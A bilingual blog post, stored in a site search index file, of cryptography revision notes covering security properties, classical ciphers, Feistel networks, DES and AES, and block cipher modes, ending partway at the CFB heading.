<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>cryptography-revision</title>
      <link href="/2021/12/16/cryptography-revision/"/>
      <url>/2021/12/16/cryptography-revision/</url>
      
        <content type="html"><![CDATA[<h2 id="一些基础概念-安全性质CIA"><a href="#一些基础概念-安全性质CIA" class="headerlink" title="一些基础概念+安全性质CIA"></a>一些基础概念+安全性质CIA</h2><p>Computer security deals with the prevention and detection of unauthorized actions by users of a computer system. </p><ul><li>Authorization is central to definition. </li><li>Sensible only relative to a security policy, stating who (or what) may perform which actions. </li></ul><p>Network security consists of the provisions made in an underlying computer network infrastructure, policies adopted by the network administrator to protect the network and the network-accessible resources from unauthorized access and the effectiveness (or lack) of these measures combined together. </p><p>Information security is (perhaps) even more general: it deals with information independent of computer systems.</p><ul><li>Note that information is more general than data. Data conveys information. But information may also be revealed, without revealing data, e.g., by statistical summaries. </li><li>Constitutes a basic right: protection of self (possessions, …)</li></ul><blockquote><p>计算机安全涉及到预防和检测计算机系统用户的未经授权的行为。</p><ul><li>授权是定义的核心。</li><li>只有相对于安全政策才是合理的，说明谁（或什么）可以执行哪些行动。</li></ul><p>网络安全包括底层计算机网络基础设施的规定，网络管理员采取的政策，以保护网络和网络可访问资源免受未经授权的访问，以及这些措施结合起来的有效性（或缺乏）。</p><p>信息安全（也许）更加普遍：它涉及独立于计算机系统的信息。</p><ul><li>请注意，信息比数据更普遍。数据传达的是信息。但信息也可以被透露，而不透露数据，例如，通过统计总结。</li><li>构成一项基本权利：保护自我（财产，……）</li></ul></blockquote><p>Information security means protecting information and information systems from unauthorized access, use, disclosure, disruption, modification, or destruction.</p><blockquote><p>信息安全是指保护信息和信息系统免受未经授权的访问、使用、披露、破坏、修改或销毁</p></blockquote><p>Cryptography is an enabling technology.</p><p>Cryptology: the study of secret writing. 对秘密写作的研究</p><p>Steganography: the science of hiding messages in other messages. 在其他信息中隐藏信息的科学</p><p>Cryptography: the science of secret writing. 秘密书写的科学</p><p>Note: terms like encrypt, encode, and encipher are often (loosely and wrongly) used interchangeably. 像加密、编码和密码这样的术语经常（松散和错误地）互换使用</p><p>Cryptanalysis: science of recovering the plaintext from ciphertext without the key. 从没有钥匙的密码文本中恢复明文的科学</p><h3 id="安全性质"><a href="#安全性质" class="headerlink" title="安全性质"></a>安全性质</h3><p>Confidentiality (Secrecy): No improper disclosure of information. 没有不正当的信息披露</p><p>Integrity: No improper modification of information. 没有对信息的不正当修改</p><p>Availability: No improper impairment of functionality/service. 没有对功能/服务的不适当的损害</p><blockquote><p>Note that: (Im)proper must be specified individually, for each system.  必须为每个系统单独指定</p><p>Alternatively, they can be formulated as: </p><p>Confidentiality: No unauthorized access to information. 没有未经授权的对信息的访问</p><p>Integrity: No unauthorized modification of information. 没有未经授权的对信息的修改</p><p>Availability: No unauthorized impairment of functionality 没有未经授权的功能损害</p></blockquote><p>机密性就是保证没有未授权下的访问，完整性就是信息没有被修改，可用性就是没有对服务/功能造成损害导致不可用</p><h3 id="quiz"><a href="#quiz" class="headerlink" title="quiz"></a>quiz</h3><p>Charlie forges Bob’s signature on a deed</p><p>Answer: violation of integrity.</p><p>Give a brief description of each of the following security properties, and explain, whenever it makes sense, the role of the sender Alice, the receiver Bob and the attackers Eve (eavesdropper) and Charlie (active attacker). Also: give an example of violation for each of the properties</p><p>Confidentiality. Privacy. Anonymity. Integrity. Availability. Authentication. Non-repudiation. Accountability.</p><p>Confidentiality: information is not learned by unauthorized principals. Alice encrypts (e.g., with Bob’s public key) the message for Bob, who decrypts it (e.g., with his private key). Eve (eavesdropper) and Charlie (active attacker) can intercept and replay the message, but are not able to decrypt it. </p><p>Several examples of violation are possible, e.g., your medical records are obtained by a potential employer without your permission.</p><p>Privacy: you choose what you let other people know, i.e., confidentiality of information that you don’t want to share. </p><p>Several examples of violation are possible, e.g., somebody applies for a job and does not include their date of birth in the application, but the interview panel (somehow) finds out the date.</p><p>Anonymity: confidentiality of your identity. </p><p>Several examples of violation are possible, e.g., a lecturer finding out the true identity of a student when marking the exams.</p><p>Integrity: data has not been (maliciously) altered. Alice encrypts (e.g., with her private key or with a MAC, sending also the message in the clear) the message and sends it to Bob, who verifies that it has not been altered (e.g., he decrypts it with Alice’s public key and verifies the signature, or he verifies the MAC). Eve and Charlie can read, intercept and replay the message, but are not able to alter it. </p><p>Several examples of violation are possible, e.g., an on-line payment system alters an electronic cheque to read £ 10,000 instead of £ 100.</p><p>Availability: data/services can be accessed when desired. Alice and Bob are able to exchange messages (or Alice is able to access the resource provided by Bob), and Eve and Charlie cannot disrupt the service. </p><p>Several examples of violation are possible, e.g., a distributed DoS (DDoS) attack against some on-line service.</p><p>Authentication: principals or data origin can be identified accurately. Alice encrypts (e.g., with her private key or with a MAC, sending also the message in the clear) the message and sends it to Bob, who can verify that it really comes from Alice. Eve and Charlie can read, intercept and replay the message, but are not able to alter the identity of the sender. Using protocols for authentication is also possible. </p><p>Several examples of violation are possible, e.g., purporting to be somebody else (identity theft) by faking email, IP spoofing, or stealing a private key and signing documents.</p><p>Non-repudiation: actions can be traced to responsible principals, who cannot deny their actions. </p><p>Alice and Bob cannot deny having sent and received the messages. In this case, the protection is more against internal attackers than with respect to external attackers such as Eve and Charlie. Several examples of violation are possible, e.g., the signer of an online contract denies to have signed it.</p><p>Accountability: Actions are recorded and can be traced to the party responsible. If prevention methods and access controls fail, we may fall back to detection: keeping a secure audit trail is important so that actions affecting security can be traced back to the responsible party. Creating an audit trail with machine logs is a tricky problem: if a system is compromised, the logs may also be tampered with. Ways around that problem are to send log messages to an append-only file, a separate server, or even a physically isolated printer. </p><p>Example violation: an audit trail is tampered with, lost, or cannot establish where a security breach occurred.</p><h2 id="一般加密模式"><a href="#一般加密模式" class="headerlink" title="一般加密模式"></a>一般加密模式</h2><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f1.png" alt=""></p><p>key1用来加密，key2用来解密</p><p>对称算法 - key1=key2或者可以很简单的由对方得到（如key2=2*key1）</p><p>非对称算法（公钥算法） - 不能由对方得到，公钥公开，私钥不公开</p><p>加密算法应该满足如果key已知了，那么加解密都应该可以很简单的执行，安全应该只取决于key的保密性，而不是算法，算法是可以公开的</p><h3 id="加密系统的三个特征"><a href="#加密系统的三个特征" class="headerlink" title="加密系统的三个特征"></a>加密系统的三个特征</h3><ol><li><p>Type of operations used to transform plaintext into ciphertext. 用于将明文转化为密文的操作类型</p><blockquote><p>所有加密算法都基于两种原理：</p><p>替换 substitution </p><p>换位 transposition</p></blockquote></li><li><p>Number of keys used.</p></li><li><p>Way in which plaintext is processed.</p><blockquote><p>block</p><p>stream</p></blockquote></li></ol><h3 id="安全使用对称加密的两个要求"><a href="#安全使用对称加密的两个要求" class="headerlink" title="安全使用对称加密的两个要求"></a>安全使用对称加密的两个要求</h3><ol><li><p>A strong encryption algorithm</p><blockquote><p>攻击者了解算法，甚至可以访问一至多条密文，也不能解密或者得到key</p><p>更一般性：即使拥有大量密文以及对应的明文，也不能得到key和解密其他密文</p></blockquote></li><li><p>Sender and receiver must obtain copies of secret key in a secure fashion (e.g., a secure channel) and must keep key secure. 发送方和接收方必须保证秘钥的安全</p></li></ol><h3 id="quiz-1"><a href="#quiz-1" class="headerlink" title="quiz"></a>quiz</h3><ol><li><p>Give a generic mathematical formalisation of an encryption scheme that maps plaintexts into ciphertexts and vice versa. (Remember to define the message spaces and all the other ingredients and properties.)</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f2.png" alt=""></p></li><li><p>How can one define symmetric-key and asymmetric-key encryption in such a generic mathematical formalisation?</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f3.png" alt=""></p></li><li><p>Define the key space K for each the following pairs of message space M and ciphertext space C: </p><p>M = {m1, m2} and C = {c1, c2} </p><p>M = {m1, m2, m3} and C = {apple, orange, peach} </p><p>M = {m1, m2, m3, m4} and C = {c1, c2, c3}</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f4.png" alt=""></p></li></ol><h2 id="替换和换位密码"><a href="#替换和换位密码" class="headerlink" title="替换和换位密码"></a>替换和换位密码</h2><h3 id="凯撒密码-Caesar-cipher"><a href="#凯撒密码-Caesar-cipher" class="headerlink" title="凯撒密码 Caesar cipher"></a>凯撒密码 Caesar cipher</h3><p>K ∈ {1, . . . , 25}:</p><p>C = E(K, P) = (P + K) mod 26 </p><p>P = D(K, C) = (C − K) mod 26</p><blockquote><p>可以暴力破解的原因：</p><ol><li>加解密算法已知</li><li>key只有25个</li><li>明文的language是已知的，人类容易识别</li></ol></blockquote><h3 id="单字母替换密码-Mono-alphabetic-substitution-ciphers"><a href="#单字母替换密码-Mono-alphabetic-substitution-ciphers" class="headerlink" title="单字母替换密码 Mono-alphabetic substitution ciphers"></a>单字母替换密码 Mono-alphabetic substitution ciphers</h3><p>即每一个字母自己设置对应将要替换为的密文字母，所以key有26！种可能性</p><p>Ee(m) = e(m1)e(m2)· · · e(mn) = c1 c2 · · · cn = c</p><p>Dd (c) = d(c1)d(c2)· · · d(cn) = m</p><blockquote><p>利用词频分析破解</p><p>英语句子有相应的高频字母，除非句子较短，而且句子用的单词不寻常</p></blockquote><h3 id="同音替换密码-Homophonic-substitution-ciphers"><a href="#同音替换密码-Homophonic-substitution-ciphers" class="headerlink" title="同音替换密码 Homophonic substitution ciphers"></a>同音替换密码 Homophonic substitution ciphers</h3><p>即让一个字母对应多个字符</p><p>A = {x, y}, H(x) = {00, 10}, and H(y) = {01, 11}.</p><p>The plaintext xy encrypts to one of 0001, 0011, 1001, 1011.</p><p>解密成本更高</p><blockquote><p>词频仍然存在，只不过是密文中的两个字符一块统计频率</p></blockquote><h3 id="普莱菲尔密码-Playfair-cipher"><a href="#普莱菲尔密码-Playfair-cipher" class="headerlink" title="普莱菲尔密码 Playfair cipher"></a>普莱菲尔密码 Playfair cipher</h3><p>使用一个5*5矩阵，总共25个格子，填26个字母</p><p>选择一个key - monarchy</p><p>把key所有字母一个一个从左到右，从上到下填到矩阵里，26个字母中其余的字母按顺序填到剩余的格子里，I/J填到一个格子里</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f5.png" alt=""></p><p>一次加密两个明文字母：</p><ol><li>俩字母是重复的，就往里面插个X（如果最后不够两个，也是插入这个规定好的填充符） （BALLOON - BA LX LO ON）</li><li>俩字母在同一行，就每个字母都往右平移一格，保持明文字母顺序（AR -&gt; RM）</li><li>在同一列，就每个字母都往下平移一格，保持明文字母顺序（MU -&gt; CM）</li><li>一般性情况，就是不同行，不同列，就每个字母所在行 与另一个字母所在列 的交点字母即为所得 （HS -&gt; BP, EA -&gt; IM/JM）</li></ol><blockquote><p>仍然保留了明文的大部分结构</p></blockquote><h3 id="多字母替换密码-Polyalphabetic-substitution-ciphers-维吉尼亚密码"><a href="#多字母替换密码-Polyalphabetic-substitution-ciphers-维吉尼亚密码" class="headerlink" title="多字母替换密码 Polyalphabetic substitution ciphers - 维吉尼亚密码"></a>多字母替换密码 Polyalphabetic substitution ciphers - 维吉尼亚密码</h3><p>使用不同的单字母替换密码</p><p>明文 P=p0, p1, …, pn-1</p><p>秘钥 K=k0, k1, …, km-1 通常m&lt;n（即明文比秘钥长度长）</p><p>密文 C=c0, c1, …, cn-1</p><p>$C_i=P_i+k_{i\ mod\ m}mod\ 26$</p><p>$P_i=C_i-k_{i\ mod\ m}mod\ 26$</p><p>key:                    deceptivedeceptivedeceptive</p><p>plaintext:          wearediscoveredsaveyourself</p><p>ciphertext:        ZICVTWQNGRZGVTWAVZHCQYGLMGJ</p><blockquote><p>同一个字母会对应不同的字母，所以词频确实隐藏了</p><p>但是仍然有相当多的频率信息</p><p>密文中同一组明文仍有可能会产生相同密文，如VTWQNGRZGVTW，都有VTW，那么猜测key就有可能是3或者9，VTW与第二个VTW隔9个，那么就像破解前面的单字母替换密码一样词频分析即可</p></blockquote><h3 id="Vername-cipher"><a href="#Vername-cipher" class="headerlink" title="Vername cipher"></a>Vername cipher</h3><p>ci = pi ⊕ ki </p><p>pi = ci ⊕ ki</p><h3 id="One-time-pad"><a href="#One-time-pad" class="headerlink" title="One-time pad"></a>One-time pad</h3><p> 密钥 K 是绝对随机的，并满足以下几点：</p><p>(1) 和明文等长</p><p>(2) 密钥不能重复使用</p><p>(3) 加解密完成后，密钥要被销毁</p><p>(4) 密文中不能有关于明文的任何内容</p><blockquote><p>难点：</p><p>需要大量随机key</p><p>key的分发和保护问题</p></blockquote><h3 id="栅栏密码-Rail-fence-cipher"><a href="#栅栏密码-Rail-fence-cipher" class="headerlink" title="栅栏密码 Rail fence cipher"></a>栅栏密码 Rail fence cipher</h3><p>深度为2</p><p>加密</p><p>明文MEET ME AFTER THE TOGA PARTY</p><p>M  E  M  A  T  R  H  T  G  P  R  Y </p><p>  E   T   E   F E   T  E  O  A  A   T</p><p>密文M E M A T R H T G P R Y E T E F E T E O A A T</p><p>解密</p><p>首先，制作一个网格，其行数与密钥相同，列数与密码文本的长度相同</p><p>将第一个字母放在左上角的方格中，并在字母的位置上斜向下划个杠，所有行画完为止</p><p>当我们回到最上面一行时，我们将下一个字母放入密码文本，循环往复，直至把第一行所有格子搞满</p><p>继续下一行，循环操作</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f6.png" alt=""></p><h3 id="Rotating-turning-grille"><a href="#Rotating-turning-grille" class="headerlink" title="Rotating (turning) grille"></a>Rotating (turning) grille</h3><p>6*6个格子，抠出9个搁置</p><p>明文 The Lord is my shepherd. I shall not be in want.</p><p>把前9个字母 从左到右，从上到下 写到抠出来的9个格子里，然后逆时针旋转90度，继续写，直到填满</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f7.png" alt=""></p><p>如何选择抠哪9个格子？</p><p>将该6*6的分成3*3的4份，每份标上1-9</p><p>在编号为 “1 “的四个方格中，选择一个方格进行切割（例如，最上面一行的最右边的方格），以确保这四个方格在加密过程中正好被暴露一次</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f8.png" alt=""></p><h3 id="Columnar-transposition-cipher"><a href="#Columnar-transposition-cipher" class="headerlink" title="Columnar transposition cipher"></a>Columnar transposition cipher</h3><p>从左到右，从上到下，将明文写到矩阵里</p><p>Key:             4 3 1 2 5 6 7 </p><p>Plaintext:   a t t a c k p </p><p>​                     o s t p o n e </p><p>​                     d u n t  i  l  t </p><p>​                     w o a m x y z </p><p>Ciphertext: TTNAAPTMTSUOAODWCOIXKNLYPETZ</p><p>即从key中的1对应的列开始写，按列写出密文</p><p>Multiple-stage columnar transposition cipher</p><p>即执行多次换位</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f9.png" alt=""></p><h3 id="quiz-2"><a href="#quiz-2" class="headerlink" title="quiz"></a>quiz</h3><ol><li><p>RIVER -&gt; EVIRE 是否使用了换位加密？</p><p>可以看到RIVER有2R, 1E ，EVIRE有2E，1R，有不同的词频，所以不可能使用换位加密 transposition</p></li><li><p>C=(P×2) mod 26是否可以作为加密算法</p><p>当×2时，A=0, N=13都会加密为A=0，B=1, O=14都会加密为C=2，显然只有偶数出现在密文中，这会让解密变得几乎不可能</p></li></ol><h2 id="关于隐写"><a href="#关于隐写" class="headerlink" title="关于隐写"></a>关于隐写</h2><p>隐写是值隐瞒消息的存在，但是密码学是通过对文本的各种转换使外界无法理解信息</p><p>隐写相对于加密而言的缺点：</p><ol><li><p>需要大量的开销去隐藏相对较少的信息bit</p></li><li><p>一旦隐写系统被发现，就变得没有价值了</p><blockquote><p>如果插入方法取决于密钥，则可以克服</p><p>或者先对信息进行加密，然后再隐藏</p></blockquote></li></ol><p>优点：</p><ol><li>可以被那些在秘密通信(不一定是内容)被发现后可能会失去某些东西的当事人使用</li><li>加密将流量标记为重要或机密，或者可能将发送方或接收方识别为需要隐藏某些内容的人</li></ol><h2 id="Feistel-cipher"><a href="#Feistel-cipher" class="headerlink" title="Feistel cipher"></a>Feistel cipher</h2><p>使用交替使用混淆和扩散功能的product cipher</p><p>S-Boxes 混淆输入位</p><p>P-Boxes 将S-Boxes的bit扩散</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f10.png" alt=""></p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>将输入块分为两部分，进行多轮重复操作</p><p>每一轮输入为上一轮产生的LEi-1, REi-1，每个Ki也都不同，都是由K产生的</p><p>F(REi , Ki+1) : w bits × y bits → w bits</p><p>最后一轮之后是撤销属于最后一轮的互换（以简化解密）</p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>LD16−i || RD16−i = REi || LEi</p><h3 id="一些性质"><a href="#一些性质" class="headerlink" title="一些性质"></a>一些性质</h3><p>块大小：</p><p>块越大，加解密越慢</p><p>传统上用64-bit 的块</p><p>AES使用128-bit</p><p>key大小：现在一般都是128-bit</p><p>轮数：轮数越多，安全性会得到提升</p><p>证明：第一轮解密的输出等于第16轮加密的输入</p><p>假设LD0=RE16, RD0=LE16</p><p>对于加密，自然有：</p><p>LE16 = RE15 </p><p>RE16 = LE15 ⊕ F(RE15, K16)</p><p>对于解密：</p><p>LD1 = RD0 = LE16 = RE15 </p><p>RD1 = LD0 ⊕ F(RD0, K16) </p><p>​        = RE16 ⊕ F(RE15, K16) </p><p>​        = (LE15 ⊕ F(RE15, K16)) ⊕ F(RE15, K16) </p><p>​        = LE15</p><p>因此 LD1 || RD1 = RE15 || LE15</p><p>该对应关系在每一轮都成立</p><p>LD16−i || RD16−i = REi || LEi    1&lt;=i&lt;=16</p><blockquote><p>归纳法证明：</p><p>假设LD15−i || RD15−i = REi+1 || LEi+1 （假设i+1轮成立）</p><p>LD16−i = RD16−i−1 = RD15−i = LEi+1 = REi </p><p>RD16−i = LD16−i−1 ⊕ F(RD16−i−1, Ki+1) </p><p>= LD15−i ⊕ F(RD15−i , Ki+1) </p><p>= REi+1 ⊕ F(LEi+1, Ki+1) </p><p>= REi+1 ⊕ F(REi , Ki+1) </p><p>= (LEi+1−1 ⊕ F(REi+1−1, Ki+1)) ⊕ F(REi , Ki+1) </p><p>= LEi</p></blockquote><h3 id="quiz-3"><a href="#quiz-3" class="headerlink" title="quiz"></a>quiz</h3><ol><li><p>第13轮的解密输出等于第几轮的加密输入，并证明</p><p>对于加密：</p><p>LE4 = RE3 </p><p>RE4 = LE3 ⊕ F(RE3, K4)</p><p>对于解密：</p><p>LD13 = RD12 = LE4 = RE3 </p><p>RD13 = LD12 ⊕ F(RD12, K4) </p><p>= RE4 ⊕ F(RE3, K4) </p><p>= (LE3 ⊕ F(RE3, K4)) ⊕ F(RE3, K4) </p><p>= LE3</p><p>因此：</p><p>LD13 || RD13 = RE3 || LE3</p></li><li><p>证明 LEi−1 = REi ⊕ F(REi−1, Ki ) and REi−1 = LEi</p><p>LEi = REi−1 成立</p><p>对于左边的，REi=LEi-1⊕ F(REi−1, Ki )，两边同时异或F(REi−1, Ki )，则有REi ⊕ F(REi−1, Ki ) = LEi-1</p></li><li><p>一个5轮的Feistel密码，函数F(X, Ki ) = X ⊕ Ki，表示各个LEi, REi</p><p>LE1 = RE0<br>RE1 = LE0 ⊕ F(RE0, K1)<br>LE2 = RE1<br>= LE0 ⊕ F(RE0, K1)</p><p>RE2 = LE1 ⊕ F(RE1, K2)<br>= RE0 ⊕ F(LE0 ⊕ F(RE0, K1), K2)</p><p>LE3 = RE2<br>= RE0 ⊕ F(LE0 ⊕ F(RE0, K1), K2)<br>= LE0 ⊕ K1 ⊕ K2</p><p>RE3 = LE2 ⊕ F(RE2, K3)<br>= LE0 ⊕ F(RE0, K1) ⊕ F(RE0 ⊕ F(LE0 ⊕ F(RE0, K1), K2), K3)<br>= RE0 ⊕ K2 ⊕ K3</p><p>LE4 = RE3 = RE0 ⊕ K2 ⊕ K3<br>RE4 = LE3 ⊕ F(RE3, K4)<br>= LE0 ⊕ K1 ⊕ K2 ⊕ RE0 ⊕ K2 ⊕ K3 ⊕ K4<br>= LE0 ⊕ RE0 ⊕ K1 ⊕ K3 ⊕ K4</p><p>LE5 = RE4 = LE0 ⊕ RE0 ⊕ K1 ⊕ K3 ⊕ K4<br>RE5 = LE4 ⊕ F(RE4, K5)<br>= RE0 ⊕ K2 ⊕ K3 ⊕ LE0 ⊕ RE0 ⊕ K1 ⊕ K3 ⊕ K4 ⊕ K5<br>= LE0 ⊕ K1 ⊕ K2 ⊕ K4 ⊕ K5</p><p>LD0 = RE5 = LE0 ⊕ K1 ⊕ K2 ⊕ K4 ⊕ K5<br>RD0 = LE5 = LE0 ⊕ RE0 ⊕ K1 ⊕ K3 ⊕ K4</p></li></ol><h2 id="DES-Data-Encryption-Standard"><a href="#DES-Data-Encryption-Standard" class="headerlink" title="DES - Data Encryption Standard"></a>DES - Data Encryption Standard</h2><h3 id="整体方案"><a href="#整体方案" class="headerlink" title="整体方案"></a>整体方案</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f11.png" alt=""></p><h3 id="关于key"><a href="#关于key" class="headerlink" title="关于key"></a>关于key</h3><p>64-bit的key分成8个字节，即8bit一份，那么每一份1的和必须是奇数</p><p>也就是说8个bit的7个bit就可以决定第8个bit是1还是0了，所以可以说是只用了56-bit的key</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><ol><li><p>Initial permutation (IP) 初始排列将会重新排列各bit</p><p>有规定好的IP表，该表中的数字即原bit的各个bit，按照该表排列好即可</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f12.png" alt=""></p></li><li><p>经历16轮的换位和替换，然后最后左右两半交换位置</p></li><li><p>将交换完位置的64-bit经过逆换位表$IP^{−1}$</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f13.png" alt=""></p></li></ol><blockquote><p>除了初始和最后的换位，DES的结构与Feistel结构完全相同</p></blockquote><p>关于key的产生：</p><ol><li>首先key经历一个换位</li><li>每一轮Ki由一个左循环移位和一个换位产生，每一轮的换位函数是相同的，由于key的移位，所以每一轮的key都不相同</li></ol><p>具体到每一轮来看：</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f14.png" alt=""></p><p>与Feistel完全相同</p><p>Li = Ri−1 </p><p>Ri = Li−1 ⊕ F(Ri−1, Ki ) 每一轮的key为48bit</p><p>Ri-1为32bit，通过扩展换位表E扩展为48bit，与Ki异或</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f15.png" alt=""></p><p>48-bit的异或结果传到S-box，产生32-bit的输出，然后经过换位表P换位</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f16.png" alt=""></p><p>关于S-box：</p><p>48-bit的输入进入8个S-box里，每个box进入6个bit，输出4个bit</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f17.png" alt=""></p><ol><li>第一个和最后一个bit组成一个2-bit二进制数，用这个数选择box里第几行</li><li>中间4个bit用来选择第几列</li><li>将box中选好的数拿出来即为输出</li></ol><blockquote><p>Example:</p><p>S1, input: 011001</p><p>则为01(1)row,1100(12)column</p><p>第一行第12列为9 （注意都是从第0行第0列开始的）</p></blockquote><p>关于key的生成：</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f18.png" alt=""></p><ol><li><p>将每一份的第8个bit忽略，所以Ci-1 Di-1都为28bit</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f19.png" alt=""></p></li><li><p>首先，key经过一个换位表PC-1，得到C0 D0</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f20.png" alt=""></p></li><li><p>在每一轮中，Ci-1和Di-1分别受到1或2比特的循环左移</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f21.png" alt=""></p></li><li><p>左移后的值再经过换位表PC-2</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f22.png" alt=""></p></li></ol><p>解密过程与加密过程算法相同，跟Feistel结构描述的一样</p><h3 id="2DES"><a href="#2DES" class="headerlink" title="2DES"></a>2DES</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f23.png" alt=""></p><p>执行两次DES，这并不等于112bit 的key</p><p>Meet-in-the-Middle攻击：</p><p>对于C = E(K2, E(K1, P))，设X = E(K1, P) = D(K2, C)</p><p>对于已知的一组P和C，用2^56个可能的K1加密P，用2^56个可能的K2解密C，验证尝试出来的每一对</p><p>所以将会在2^56次数内成功</p><h3 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f24.png" alt=""></p><p>3DES与DES兼容，即K1=K2即可</p><p>当用3个不同的key K1,K2,K3时，就等于168bit的key</p><h3 id="S-DES"><a href="#S-DES" class="headerlink" title="S-DES"></a>S-DES</h3><p>为了教学用途而有的</p><p>一个block为8-bit，key为10-bit</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f26.png" alt=""></p><p>IP表为</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f27.png" alt=""></p><p>$IP^{−1}$表为</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f28.png" alt=""></p><p>扩展换位表E/P为</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f29.png" alt=""></p><p>S-box为</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f31.png" alt=""></p><p>换位表P为</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f30.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f32.png" alt=""></p><blockquote><p>图中SW即为交换，也就是DES中的</p><p>Li = Ri−1 </p><p>Ri = Li−1 ⊕ F(Ri−1, Ki ) </p></blockquote><p>关于key的产生：</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f33.png" alt=""></p><h3 id="Quiz"><a href="#Quiz" class="headerlink" title="Quiz"></a>Quiz</h3><p>Why is the middle portion of triple-DES a decryption rather than an encryption? 为什么三重DES的中间部分是解密而不是加密？</p><p>为了与DES兼容，K1=K2=K3时，3-DES就会变成DES</p><h2 id="AES-Advanced-Encryption-Standard"><a href="#AES-Advanced-Encryption-Standard" class="headerlink" title="AES - Advanced Encryption Standard"></a>AES - Advanced Encryption Standard</h2><p>不使用Feistel结构，每个block为128-bit，key为128，192 or 256bit，根据key的大小分为AES-128, AES-192, or AES-256</p><p>每一轮由4个函数组成，字节替换，换位，有限域上的算术运算，以及与密钥的XOR运算</p><p>10 rounds for a 16-byte key </p><p>12 rounds for a 24-byte key </p><p>14 rounds for a 32-byte key</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f25.png" alt=""></p><h2 id="块密码的操作模式"><a href="#块密码的操作模式" class="headerlink" title="块密码的操作模式"></a>块密码的操作模式</h2><h3 id="Electronic-Codebook-ECB"><a href="#Electronic-Codebook-ECB" class="headerlink" title="Electronic Codebook (ECB)"></a>Electronic Codebook (ECB)</h3><p>即每个块单独加解密</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f34.png" alt=""></p><p>安全性：</p><p>对于冗长的信息，ECB模式可能是不安全的</p><p>如果明文的相同的b-bit块在信息中出现多次，则对应的密文也会相同</p><p>如果信息是高度结构化的，密码分析员就有可能利用这些规律性的东西</p><p>例如：如果已知信息总是以某些预定义的字段开始，那么密码分析员可能有一些已知的明文-密文对可供利用</p><p>因此：不建议对超过一个区块的信息进行处理。适合于短的数据量，如加密密钥。例如，安全地传输DES或AES密钥</p><h3 id="Cipher-block-Chaining-CBC"><a href="#Cipher-block-Chaining-CBC" class="headerlink" title="Cipher-block Chaining (CBC)"></a>Cipher-block Chaining (CBC)</h3><p>为了克服ECB的弱点，即重复的块应该产生不同的密文块，最后一个块不足b-bit就填充</p><p>C0 = IV (初始向量)  1 &lt; i ≤ N: </p><p>初始向量为一个与密码块大小相同的数据块，IV必须是发送方和接收方都知道的，但第三方无法预测，并且要防止未经授权的更改。这可以通过使用ECB加密发送IV来实现</p><p>Encryption: </p><p>C1 = E(K, IV ⊕ P1 )</p><p>Ci = E(K, Ci−1 ⊕ Pi )</p><p>Decryption:  </p><p>P1 = D(K, C1 ) ⊕ IV </p><p>Pi = D(K, Ci ) ⊕ Ci−1</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f35.png" alt=""></p><p>正确性：</p><p>Pi = D(K, Ci) ⊕ Ci−1<br>= D(K, E(K, Ci−1 ⊕ Pi)) ⊕ Ci−1<br>= (Ci−1 ⊕ Pi) ⊕ Ci−1<br>= Pi</p><p>重复块不会出现相同密文：每个明文块的加密函数的输入与明文块没有固定关系</p><p>性质：</p><p>相同的明文块被映射到不同的密文</p><p>链式依赖性 - Ci依赖于所有前面的明文</p><p>自我同步：如果在Ci中发生错误（如有比特位发生变化，或者有块被丢弃），但不是Ci+1，那么Ci+2会被正确解密</p><p>CBC适合于加密长度大于b-bit的信息，可用于保密性和认证</p><p>CFB和OFB都可以将块状密码转换为流密码</p><h3 id="Cipher-FeedBack-CFB"><a href="#Cipher-FeedBack-CFB" class="headerlink" title="Cipher FeedBack (CFB)"></a>Cipher FeedBack 